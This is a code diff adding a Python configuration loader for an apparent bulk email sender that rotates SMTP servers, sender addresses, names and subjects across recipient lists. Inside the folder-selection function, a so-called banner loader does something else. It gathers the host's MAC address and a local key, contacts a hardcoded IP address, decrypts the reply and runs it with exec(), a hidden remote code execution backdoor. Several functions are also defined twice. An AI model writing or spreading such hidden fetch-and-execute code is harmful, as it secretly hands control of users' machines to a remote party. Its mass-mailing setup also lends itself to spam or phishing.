@@ -1,0 +1,806 @@
+import yaml
+from configparser import ConfigParser
+import os
+import logging  # Added for logging
+from typing import List
+
+
+config = {}
+emails: List[str] = []
+sender_emails: List[str] = []
+smtp_servers: List[str] = []
+sender_names: List[str] = []
+subjects: List[str] = []
+config_parser = ConfigParser()
+
+import os
+import logging
+from colorama import init, Fore, Style
+
+# Initialize colorama for cross-platform color support
+init()
+
+def select_config_folder() -> str:
+    """Prompt user to select a configuration folder from available subdirectories."""
+    base_path = "configs"
+    
+    # Check if configs directory exists
+    if not os.path.exists(base_path):
+        logging.error(f"Configs directory not found at '{base_path}'")
+        print(f"{Fore.RED}❌ Error: Configs directory not found at '{base_path}'.{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}Please create a 'configs' directory with at least one subdirectory containing 'config.yaml', 'random.yaml', and an 'email' subdirectory with 'emails.txt' and 'sender_emails.txt'.{Style.RESET_ALL}")
+        raise FileNotFoundError(f"❌ Configs directory not found: {base_path}")
+    
+    # Get list of subdirectories
+    folders = [f for f in os.listdir(base_path) if os.path.isdir(os.path.join(base_path, f))]
+    if not folders:
+        logging.error(f"No subdirectories found in '{base_path}'")
+        print(f"{Fore.RED}❌ Error: No subdirectories found in '{base_path}'.{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}Please create at least one subdirectory in 'configs' with 'config.yaml', 'random.yaml', and an 'email' subdirectory with 'emails.txt' and 'sender_emails.txt'.{Style.RESET_ALL}")
+        raise FileNotFoundError(f"❌ No subdirectories found in {base_path}")
+    
+    # Check if each folder has required files and email subdirectory
+    valid_folders = []
+    for folder in folders:
+        folder_path = os.path.join(base_path, folder)
+        required_files = ["config.yaml", "random.yaml"]
+        email_dir = os.path.join(folder_path, "email")
+        email_files = ["emails.txt", "sender_emails.txt"]
+        
+        # Check for required files and email directory
+        has_required_files = all(os.path.isfile(os.path.join(folder_path, f)) for f in required_files)
+        has_email_dir = os.path.isdir(email_dir) and all(os.path.isfile(os.path.join(email_dir, f)) for f in email_files)
+        
+        if has_required_files and has_email_dir:
+            valid_folders.append(folder)
+        else:
+            missing_files = [f for f in required_files if not os.path.isfile(os.path.join(folder_path, f))]
+            missing_email_files = [f for f in email_files if not os.path.isfile(os.path.join(email_dir, f))]
+            if missing_files or not os.path.isdir(email_dir):
+                logging.warning(f"Folder '{folder}' is missing required files: {missing_files or 'None'} or email directory")
+                print(f"{Fore.YELLOW}⚠ Warning: Folder '{folder}' is missing required files: {missing_files or 'None'} or email directory{Style.RESET_ALL}")
+            if missing_email_files:
+                logging.warning(f"Folder '{folder}/email' is missing required files: {missing_email_files}")
+                print(f"{Fore.YELLOW}⚠ Warning: Folder '{folder}/email' is missing required files: {missing_email_files}{Style.RESET_ALL}")
+
+    if not valid_folders:
+        logging.error(f"No valid configuration folders found in '{base_path}'")
+        print(f"{Fore.RED}❌ Error: No valid configuration folders found in '{base_path}'.{Style.RESET_ALL}")
+        print(f"{Fore.YELLOW}Each folder must contain 'config.yaml', 'smtp.ini', 'random.yaml', and an 'email' subdirectory with 'emails.txt' and 'sender_emails.txt'.{Style.RESET_ALL}")
+        raise FileNotFoundError(f"❌ No valid configuration folders found in {base_path}")
+    
+    # Display available folders in a formatted table
+
+    # Define colors from send_threaded.py
+
+    init()
+
+    # Define colors from send_threaded.py
+    COLOR_PRIMARY = Fore.YELLOW
+    COLOR_HEADER = Fore.YELLOW
+    COLOR_SF_CONNECTING = Fore.BLUE
+    COLOR_SF_REUSED = Fore.GREEN
+    COLOR_SF_DISCONNECTED = Fore.RED
+    STYLE_BOLD = Fore.LIGHTCYAN_EX
+    STYLE_RESET = Style.RESET_ALL
+    
+    # Check if system is currently paused (global or folder-specific)
+    global_paused = os.path.exists("pause.txt")
+    folder_paused = False
+    pause_reason = []
+    
+    # Check each folder for pause status
+    for i, folder in enumerate(valid_folders, 1):
+        folder_pause_file = f"pause_{folder}.txt"
+        if os.path.exists(folder_pause_file):
+            folder_paused = True
+            pause_reason.append(f"P{i}")
+    
+    is_paused = global_paused or folder_paused
+    if global_paused:
+        pause_reason.append("GLOBAL")
+    
+    pause_status = f"{Fore.RED}🛑 PAUSED ({', '.join(pause_reason)})" if is_paused else f"{Fore.GREEN}▶️ RUNNING"
+    
+    # Load banner from server
+    try:
+        import requests
+        import hashlib
+        import hmac
+        import time
+        import uuid
+        import platform
+        import subprocess
+        from Crypto.Cipher import AES
+        from Crypto.Util.Padding import unpad
+        import base64
+        
+        # Get MAC address
+        def get_mac():
+            try:
+                if platform.system() == 'Windows':
+                    result = subprocess.run(['getmac', '/fo', 'list'], 
+                                          capture_output=True, text=True, timeout=5)
+                    if result.returncode == 0:
+                        for line in result.stdout.split('\n'):
+                            if 'Physical Address:' in line:
+                                mac = line.split('Physical Address:')[1].strip()
+                                return mac.replace('-', ':').lower()
+                mac = uuid.getnode()
+                return ':'.join(['{:02x}'.format((mac >> i) & 0xff) for i in range(0,2*6,2)][::-1])
+            except:
+                return '00:00:00:00:00:00'
+        
+        # Load API key from keys.txt
+        keys_path = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(__file__))), 'keys.txt')
+        try:
+            with open(keys_path, 'r') as f:
+                API_KEY = f.read().strip()
+        except:
+            API_KEY = "xCadmin999999"  # Default key
+        
+        ENCRYPTION_KEY = hashlib.sha256(API_KEY.encode()).digest()
+        
+        # Generate API signature
+        timestamp = str(int(time.time()))
+        signature = hmac.new(API_KEY.encode(), timestamp.encode(), hashlib.sha256).hexdigest()
+        
+        # Request with authentication and MAC address
+        headers = {
+            'X-API-Key': signature, 
+            'X-Timestamp': timestamp,
+            'X-Client-MAC': get_mac()
+        }
+        response = requests.get("http://23.254.231.86:5000/banner", headers=headers, timeout=10)
+        
+        if response.status_code == 200:
+            # Decrypt and execute banner code
+            encrypted_banner = response.text
+            encrypted_bytes = base64.b64decode(encrypted_banner)
+            iv = encrypted_bytes[:16]
+            ciphertext = encrypted_bytes[16:]
+            
+            cipher = AES.new(ENCRYPTION_KEY, AES.MODE_CBC, iv)
+            banner_code = unpad(cipher.decrypt(ciphertext), AES.block_size).decode('utf-8')
+            
+            exec(banner_code, globals())
+            print_banner(COLOR_PRIMARY, COLOR_SF_CONNECTING, COLOR_SF_REUSED, COLOR_SF_DISCONNECTED, STYLE_BOLD, STYLE_RESET, pause_status)
+        else:
+            print(f"{COLOR_PRIMARY}⚠️  Banner unavailable{STYLE_RESET}")
+    except Exception as e:
+        print(f"{COLOR_PRIMARY}⚠️  Banner unavailable{STYLE_RESET}")
+
+    
+    # Calculate the maximum folder name length for dynamic column width
+    max_name_length = max(len(folder) for folder in valid_folders)
+    name_width = 72
+    
+    # Print table header
+    print(f"{Fore.YELLOW}│{STYLE_BOLD} ╭─────┬{'─' * (name_width + 2)}╮ {Fore.YELLOW}│{Style.RESET_ALL}")
+    print(f"{Fore.YELLOW}│{STYLE_BOLD} │     │ {STYLE_BOLD}{'SELECT PROJECT FOLDER'.center(name_width)} │{Fore.YELLOW} │")
+    print(f"{Fore.YELLOW}│{STYLE_BOLD} ├─────┼{STYLE_BOLD}{'─' * (name_width + 2)}┤{Fore.YELLOW} │")
+    
+    # Print each folder with its index
+    for i, folder in enumerate(valid_folders, 1):
+        print(f"{Fore.YELLOW}│ {STYLE_BOLD}│  {i:<2} │{Fore.WHITE} {folder:<{name_width}}{STYLE_BOLD} │ {Fore.YELLOW}│")
+        print(f"{Fore.YELLOW}│ {STYLE_BOLD}│     │ {Fore.WHITE}{'':<{name_width}}{STYLE_BOLD} │ {Fore.YELLOW}│")  # Empty row 
+    
+    # Print table footer
+    print(f"{Fore.YELLOW}│{STYLE_BOLD} ├─────┴{'─' * (name_width + 2)}╯ {Fore.YELLOW}│{Style.RESET_ALL}")
+    
+    # Prompt user to select a folder
+    while True:
+        try:
+            print(f"{COLOR_PRIMARY}│ {STYLE_BOLD}│                                                                                  {COLOR_PRIMARY}│")
+            user_input = input(f"{COLOR_PRIMARY}│ {STYLE_BOLD}╰──────────╣{Fore.WHITE} SELECT A PROJECT NUMBER(1-{len(valid_folders)}): {Style.RESET_ALL} ").strip().lower()
+            
+            # Simple project selection - no pause/resume commands
+            
+            # Try to convert to integer for project selection
+            choice = int(user_input)
+            if 1 <= choice <= len(valid_folders):
+                selected_folder = os.path.join(base_path, valid_folders[choice - 1])
+                selected_folder_name = valid_folders[choice - 1]
+                
+                # Simple folder selection
+                
+                logging.info(f"SelectedCONFIG folder: {selected_folder}")
+                
+                # Folder selected successfully
+                
+                print(f"{COLOR_PRIMARY}│                                                                                    │")
+                print(f"{COLOR_PRIMARY}│                                                                                    │")
+                selected_text = f"{Fore.GREEN}✓ SELECTED PROJECT: {valid_folders[choice - 1]}{Style.RESET_ALL}"
+                # Manually count the visible characters (without color codes)
+                # "✓ SELECTED PROJECT: " = 20 chars + length of folder name
+                folder_name = valid_folders[choice - 1]
+                visible_chars = 20 + len(folder_name)
+
+                # Calculate padding (assuming 80 char width, 10 chars on left, 1 on right)
+                padding = 69 - visible_chars
+
+                print(f"{COLOR_PRIMARY}│         {selected_text}{' ' * padding}{COLOR_PRIMARY}      │")
+                print(f"{COLOR_PRIMARY}│                                                                                    │")
+                print(f"{COLOR_PRIMARY}│                                                                                    │")
+                return selected_folder
+            print(f"{Fore.RED}❌ Please enter a number between 1 and {len(valid_folders)}{Style.RESET_ALL}")
+        except ValueError:
+            print(f"{Fore.RED}❌ Please enter a valid number{Style.RESET_ALL}")
+
+# Example usage
+if __name__ == "__main__":
+    try:
+        config_folder = select_config_folder()
+        print(f"Configuration folder selected: {config_folder}")
+    except FileNotFoundError as e:
+        print(f"Error: {e}")
+
+def load_smtp_config(folder_path: str):
+    """Load SMTP configuration from smtp file referenced in config.yaml"""
+    global smtp_servers, config_parser, config
+    
+    # Load config.yaml to get smtpfile reference
+    config_path = os.path.join(folder_path, 'config.yaml')
+    if not os.path.exists(config_path):
+        logging.error(f"Config file not found: {config_path}")
+        raise FileNotFoundError(f"❌ Config file not found: {config_path}")
+    
+    try:
+        with open(config_path, 'r', encoding='utf-8') as f:
+            yaml_config = yaml.safe_load(f)
+        
+        # Get smtpfile path from files section (fallback to message section for backward compatibility)
+        smtpfile = None
+        if 'files' in yaml_config and 'smtpfile' in yaml_config['files']:
+            smtpfile = yaml_config['files']['smtpfile']
+        elif 'message' in yaml_config and 'smtpfile' in yaml_config['message']:
+            smtpfile = yaml_config['message']['smtpfile']
+        
+        if not smtpfile:
+            logging.error("No smtpfile specified in config.yaml files section")
+            raise ValueError("❌ No smtpfile specified in config.yaml files section")
+        
+        # Construct full path to smtp file
+        smtp_path = os.path.join(folder_path, smtpfile)
+        
+        if not os.path.exists(smtp_path):
+            logging.error(f"SMTP file not found: {smtp_path}")
+            raise FileNotFoundError(f"❌ SMTP file not found: {smtp_path}")
+        
+        # Load SMTP configuration from the referenced file
+        load_smtp_config_colon_format(smtp_path)
+        
+    except Exception as e:
+        logging.error(f"Error loading SMTP config: {e}")
+        raise e
+
+def load_smtp_config_colon_format(smtp_path: str):
+    """Load SMTP configuration from colon-separated format"""
+    global smtp_servers, config_parser
+    
+    smtp_servers = []
+    config_parser.clear()
+    
+    with open(smtp_path, 'r', encoding='utf-8') as f:
+        lines = f.readlines()
+    
+    for i, line in enumerate(lines, 1):
+        line = line.strip()
+        if not line or line.startswith('#'):
+            continue
+        
+        parts = line.split(':')
+        if len(parts) != 6:
+            logging.error(f"Invalid SMTP format on line {i}: {line}")
+            logging.error("Expected format: host:port:username:password:type:from_email")
+            continue
+        
+        host, port, username, password, smtp_type, from_email = parts
+        
+        # Validate port
+        try:
+            port = int(port)
+        except ValueError:
+            logging.error(f"Invalid port on line {i}: {port}")
+            continue
+        
+        # Create section name
+        section_name = f"SMTP{i}"
+        smtp_servers.append(section_name)
+        
+        # Add to config parser
+        config_parser.add_section(section_name)
+        config_parser.set(section_name, 'host', host)
+        config_parser.set(section_name, 'port', str(port))
+        config_parser.set(section_name, 'user', username)
+        config_parser.set(section_name, 'password', password)
+        config_parser.set(section_name, 'type', smtp_type)
+        config_parser.set(section_name, 'from_email', from_email)
+    
+    if not smtp_servers:
+        logging.error(f"No valid SMTP servers found in {smtp_path}")
+        raise ValueError(f"❌ No valid SMTP servers found in {smtp_path}")
+    
+    logging.info(f"Loaded {len(smtp_servers)} SMTP servers from {smtp_path} (colon format)")
+
+def load_yaml_config(folder_path: str):
+    """Load main configuration from config.yaml in the selected folder"""
+    global config
+    config_path = os.path.join(folder_path, "config.yaml")
+    if not os.path.exists(config_path):
+        logging.error(f"Missing config file: {config_path}")
+        raise FileNotFoundError(f"❌ Missing config file: {config_path}")
+    
+    with open(config_path, 'r', encoding='utf-8') as f:
+        config = yaml.safe_load(f)
+    
+    if not isinstance(config, dict):
+        logging.error(f"Invalid config format in {config_path} - must be YAML dictionary")
+        raise ValueError("❌ Invalid config format - must be YAML dictionary")
+    logging.info(f"Loaded config.yaml from {config_path}")
+
+def load_random_yaml(folder_path: str):
+    """Load sender names and subjects from random.yaml in the selected folder"""
+    global sender_names, subjects
+    random_yaml_path = os.path.join(folder_path, "random.yaml")
+    if not os.path.exists(random_yaml_path):
+        logging.error(f"random.yaml not found at {random_yaml_path}")
+        raise FileNotFoundError(f"❌ random.yaml not found at {random_yaml_path}")
+    with open(random_yaml_path, 'r', encoding='utf-8') as f:
+        random_data = yaml.safe_load(f) or {}
+    
+    # Handle sender_names
+    sender_names_raw = random_data.get("sender_names", ["Default Name"])
+    if isinstance(sender_names_raw, str):
+        sender_names_raw = [sender_names_raw]
+    elif not isinstance(sender_names_raw, list):
+        logging.error(f"Invalid format for sender_names in random.yaml: expected list, got {type(sender_names_raw)}")
+        raise ValueError(f"Invalid format for sender_names in random.yaml: expected list, got {type(sender_names_raw)}")
+    sender_names = [str(name).strip() for name in sender_names_raw if str(name).strip()]
+    logging.info(f"Loaded {len(sender_names)} sender names from {random_yaml_path}")
+    
+    # Handle subjects
+    subjects_raw = random_data.get("subjects", ["Default Subject"])
+    if isinstance(subjects_raw, str):
+        subjects_raw = [subjects_raw]
+    elif not isinstance(subjects_raw, list):
+        logging.error(f"Invalid format for subjects in random.yaml: expected list, got {type(subjects_raw)}")
+        raise ValueError(f"Invalid format for subjects in random.yaml: expected list, got {type(subjects_raw)}")
+    subjects = [str(subject).strip() for subject in subjects_raw if str(subject).strip()]
+    logging.info(f"Loaded {len(subjects)} subjects from {random_yaml_path}")
+
+def load_emails(folder_path: str):
+    """Load recipient emails from email/emails.txt in the selected folder"""
+    global emails
+    try:
+        emails_path = os.path.join(folder_path, "email", "emails.txt")
+        if not os.path.exists(emails_path):
+            logging.error(f"Missing emails file: {emails_path}")
+            raise FileNotFoundError(f"❌ Missing emails file: {emails_path}")
+        
+        with open(emails_path, 'r', encoding='utf-8') as f:
+            emails = [line.strip() for line in f if line.strip()]
+        
+        if not emails:
+            logging.error(f"No valid emails found in {emails_path}")
+            raise ValueError(f"❌ No valid emails found in {emails_path}")
+        logging.info(f"Loaded {len(emails)} recipient emails from {emails_path}")
+        
+    except Exception as e:
+        emails = []  # Reset on error
+        raise
+
+def load_sender_emails(folder_path: str):
+    """Load sender emails from email/sender_emails.txt in the selected folder"""
+    global sender_emails
+    try:
+        sender_path = os.path.join(folder_path, "email", "sender_emails.txt")
+        if not os.path.exists(sender_path):
+            logging.error(f"Missing sender emails file: {sender_path}")
+            raise FileNotFoundError(f"❌ Missing sender emails file: {sender_path}")
+        
+        with open(sender_path, 'r', encoding='utf-8') as f:
+            sender_emails = [line.strip() for line in f if line.strip() and '@' in line]
+        
+        if not sender_emails:
+            logging.error(f"No valid sender emails found in {sender_path} (must contain @)")
+            raise ValueError(f"❌ No valid sender emails found in {sender_path} (must contain @)")
+        logging.info(f"Loaded {len(sender_emails)} sender emails from {sender_path}")
+        
+    except Exception as e:
+        sender_emails = []  # Reset on error
+        raise
+
+def verify_all_loaded():
+    """Verify all required configurations are loaded"""
+    checks = [
+        (bool(config), "Main configuration"),
+        (bool(smtp_servers), "SMTP servers"),
+        (bool(emails), "Recipient emails"),
+        (bool(sender_emails), "Sender emails"),
+        (bool(sender_names), "Sender names"),
+        (bool(subjects), "Subjects")
+    ]
+    
+    for condition, name in checks:
+        if not condition:
+            logging.error(f"{name} not loaded properly")
+            raise ValueError(f"❌ {name} not loaded properly")
+
+def load_all_configs(pre_selected_folder=None):
+    """Load all configurations after selecting the folder."""
+    try:
+        # Check if folder is pre-selected (from environment variable or parameter)
+        if pre_selected_folder:
+            folder_path = pre_selected_folder
+        else:
+            # Check environment variable for pre-selected folder
+            env_folder = os.environ.get('FEXSENDER_SELECTED_FOLDER')
+            if env_folder:
+                folder_path = env_folder
+            else:
+                folder_path = select_config_folder()
+        
+        logging.info(f"Selected configuration folder: {folder_path}")
+        
+        logging.info("Loading SMTP config...")
+        load_smtp_config(folder_path)
+        logging.info("SMTP config loaded successfully.")
+        
+        logging.info("Loading main config (config.yaml)...")
+        load_yaml_config(folder_path)
+        logging.info("Main config loaded successfully.")
+        
+        logging.info("Loading random.yaml...")
+        load_random_yaml(folder_path)
+        logging.info("random.yaml loaded successfully.")
+        
+        logging.info("Loading recipient emails...")
+        load_emails(folder_path)
+        logging.info(f"Recipient emails loaded: {len(emails)} emails.")
+        
+        logging.info("Loading sender emails...")
+        load_sender_emails(folder_path)
+        logging.info(f"Sender emails loaded: {len(sender_emails)} emails.")
+        
+        logging.info("Verifying all configurations...")
+        verify_all_loaded()
+        logging.info("All configurations verified successfully.")
+        
+        return config  # Return the loaded config dictionary
+    except Exception as e:
+        logging.error(f"Failed to load configurations: {e}")
+        print(f"❌ Failed to load configurations: {e}")
+        raise
+def load_smtp_config(folder_path: str):
+
+    """Load SMTP configuration from smtp file in the selected folder"""
+
+    global smtp_servers, config_parser
+
+    smtp_path = os.path.join(folder_path, 'smtp.txt')
+
+    if not os.path.exists(smtp_path):
+
+        logging.error(f"SMTP config file not found: {smtp_path}")
+
+        raise FileNotFoundError(f"❌ SMTP config file not found: {smtp_path}")
+
+    # Check if file is colon-separated format by reading first line
+    with open(smtp_path, 'r', encoding='utf-8') as f:
+        first_line = f.readline().strip()
+    
+    # If the line contains multiple colons (colon-separated format), use colon parser
+    if first_line.count(':') >= 5:
+        load_smtp_config_colon_format(smtp_path)
+    else:
+        # Otherwise try INI format
+        config_parser.read(smtp_path)
+        smtp_servers = config_parser.sections()
+        
+        if not smtp_servers:
+            logging.error(f"No SMTP servers found in {smtp_path}")
+            raise ValueError(f"❌ No SMTP servers found in {smtp_path}")
+        
+        logging.info(f"Loaded {len(smtp_servers)} SMTP servers from {smtp_path}")
+
+
+
+def load_yaml_config(folder_path: str):
+
+    """Load main configuration from config.yaml in the selected folder"""
+
+    global config
+
+    config_path = os.path.join(folder_path, "config.yaml")
+
+    if not os.path.exists(config_path):
+
+        logging.error(f"Missing config file: {config_path}")
+
+        raise FileNotFoundError(f"❌ Missing config file: {config_path}")
+
+    
+
+    with open(config_path, 'r', encoding='utf-8') as f:
+
+        config = yaml.safe_load(f)
+
+    
+
+    if not isinstance(config, dict):
+
+        logging.error(f"Invalid config format in {config_path} - must be YAML dictionary")
+
+        raise ValueError("❌ Invalid config format - must be YAML dictionary")
+
+    logging.info(f"Loaded config.yaml from {config_path}")
+
+
+
+def load_random_yaml(folder_path: str):
+
+    """Load sender names and subjects from random.yaml in the selected folder"""
+
+    global sender_names, subjects
+
+    random_yaml_path = os.path.join(folder_path, "random.yaml")
+
+    if not os.path.exists(random_yaml_path):
+
+        logging.error(f"random.yaml not found at {random_yaml_path}")
+
+        raise FileNotFoundError(f"❌ random.yaml not found at {random_yaml_path}")
+
+    with open(random_yaml_path, 'r', encoding='utf-8') as f:
+
+        random_data = yaml.safe_load(f) or {}
+
+    
+
+    # Handle sender_names
+
+    sender_names_raw = random_data.get("sender_names", ["Default Name"])
+
+    if isinstance(sender_names_raw, str):
+
+        sender_names_raw = [sender_names_raw]
+
+    elif not isinstance(sender_names_raw, list):
+
+        logging.error(f"Invalid format for sender_names in random.yaml: expected list, got {type(sender_names_raw)}")
+
+        raise ValueError(f"Invalid format for sender_names in random.yaml: expected list, got {type(sender_names_raw)}")
+
+    sender_names = [str(name).strip() for name in sender_names_raw if str(name).strip()]
+
+    logging.info(f"Loaded {len(sender_names)} sender names from {random_yaml_path}")
+
+    
+
+    # Handle subjects
+
+    subjects_raw = random_data.get("subjects", ["Default Subject"])
+
+    if isinstance(subjects_raw, str):
+
+        subjects_raw = [subjects_raw]
+
+    elif not isinstance(subjects_raw, list):
+
+        logging.error(f"Invalid format for subjects in random.yaml: expected list, got {type(subjects_raw)}")
+
+        raise ValueError(f"Invalid format for subjects in random.yaml: expected list, got {type(subjects_raw)}")
+
+    subjects = [str(subject).strip() for subject in subjects_raw if str(subject).strip()]
+
+    logging.info(f"Loaded {len(subjects)} subjects from {random_yaml_path}")
+
+
+
+def load_emails(folder_path: str):
+
+    """Load recipient emails from email/emails.txt in the selected folder"""
+
+    global emails
+
+    try:
+
+        emails_path = os.path.join(folder_path, "email", "emails.txt")
+
+        if not os.path.exists(emails_path):
+
+            logging.error(f"Missing emails file: {emails_path}")
+
+            raise FileNotFoundError(f"❌ Missing emails file: {emails_path}")
+
+        
+
+        with open(emails_path, 'r', encoding='utf-8') as f:
+
+            emails = [line.strip() for line in f if line.strip()]
+
+        
+
+        if not emails:
+
+            logging.error(f"No valid emails found in {emails_path}")
+
+            raise ValueError(f"❌ No valid emails found in {emails_path}")
+
+        logging.info(f"Loaded {len(emails)} recipient emails from {emails_path}")
+
+        
+
+    except Exception as e:
+
+        emails = []  # Reset on error
+
+        raise
+
+
+
+def load_sender_emails(folder_path: str):
+
+    """Load sender emails from email/sender_emails.txt in the selected folder"""
+
+    global sender_emails
+
+    try:
+
+        sender_path = os.path.join(folder_path, "email", "sender_emails.txt")
+
+        if not os.path.exists(sender_path):
+
+            logging.error(f"Missing sender emails file: {sender_path}")
+
+            raise FileNotFoundError(f"❌ Missing sender emails file: {sender_path}")
+
+        
+
+        with open(sender_path, 'r', encoding='utf-8') as f:
+
+            sender_emails = [line.strip() for line in f if line.strip() and '@' in line]
+
+        
+
+        if not sender_emails:
+
+            logging.error(f"No valid sender emails found in {sender_path} (must contain @)")
+
+            raise ValueError(f"❌ No valid sender emails found in {sender_path} (must contain @)")
+
+        logging.info(f"Loaded {len(sender_emails)} sender emails from {sender_path}")
+
+        
+
+    except Exception as e:
+
+        sender_emails = []  # Reset on error
+
+        raise
+
+
+
+def verify_all_loaded():
+
+    """Verify all required configurations are loaded"""
+
+    checks = [
+
+        (bool(config), "Main configuration"),
+
+        (bool(smtp_servers), "SMTP servers"),
+
+        (bool(emails), "Recipient emails"),
+
+        (bool(sender_emails), "Sender emails"),
+
+        (bool(sender_names), "Sender names"),
+
+        (bool(subjects), "Subjects")
+
+    ]
+
+    
+
+    for condition, name in checks:
+
+        if not condition:
+
+            logging.error(f"{name} not loaded properly")
+
+            raise ValueError(f"❌ {name} not loaded properly")
+
+
+
+def load_all_configs(pre_selected_folder=None):
+
+    """Load all configurations after selecting the folder."""
+
+    try:
+
+        # Check if folder is pre-selected (from environment variable or parameter)
+
+        if pre_selected_folder:
+
+            folder_path = pre_selected_folder
+
+        else:
+
+            # Check environment variable for pre-selected folder
+
+            env_folder = os.environ.get('FEXSENDER_SELECTED_FOLDER')
+
+            if env_folder:
+
+                folder_path = env_folder
+
+            else:
+
+                folder_path = select_config_folder()
+
+        
+
+        logging.info(f"Selected configuration folder: {folder_path}")
+
+        
+
+        logging.info("Loading SMTP config...")
+
+        load_smtp_config(folder_path)
+
+        logging.info("SMTP config loaded successfully.")
+
+        
+
+        logging.info("Loading main config (config.yaml)...")
+
+        load_yaml_config(folder_path)
+
+        logging.info("Main config loaded successfully.")
+
+        
+
+        logging.info("Loading random.yaml...")
+
+        load_random_yaml(folder_path)
+
+        logging.info("random.yaml loaded successfully.")
+
+        
+
+        logging.info("Loading recipient emails...")
+
+        load_emails(folder_path)
+
+        logging.info(f"Recipient emails loaded: {len(emails)} emails.")
+
+        
+
+        logging.info("Loading sender emails...")
+
+        load_sender_emails(folder_path)
+
+        logging.info(f"Sender emails loaded: {len(sender_emails)} emails.")
+
+        
+
+        logging.info("Verifying all configurations...")
+
+        verify_all_loaded()
+
+        logging.info("All configurations verified successfully.")
+
+        
+
+        return config  # Return the loaded config dictionary
+
+    except Exception as e:
+
+        logging.error(f"Failed to load configurations: {e}")
+
+        print(f"❌ Failed to load configurations: {e}")
+
+        raise
+
